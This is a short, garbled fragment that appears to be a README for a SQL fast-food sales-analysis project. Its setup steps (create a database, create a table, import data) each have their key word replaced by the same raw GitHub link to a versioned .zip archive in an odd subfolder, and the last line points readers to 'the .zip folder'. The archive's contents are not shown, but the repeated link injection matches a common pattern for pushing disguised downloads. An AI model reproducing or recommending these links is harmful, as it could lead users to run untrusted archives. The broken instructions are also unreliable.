...
https://github.com/Siam-analytics/sql_sales_analysis/raw/refs/heads/main/tanist/sales_analysis_sql_v1.5.zip a Database: e.g. 
```sql
CREATE DATABASE fast_food;
```
https://github.com/Siam-analytics/sql_sales_analysis/raw/refs/heads/main/tanist/sales_analysis_sql_v1.5.zip a Table: e.g.
```sql
...
```
https://github.com/Siam-analytics/sql_sales_analysis/raw/refs/heads/main/tanist/sales_analysis_sql_v1.5.zip Import:
...
https://github.com/Siam-analytics/sql_sales_analysis/raw/refs/heads/main/tanist/sales_analysis_sql_v1.5.zip the .zip folder
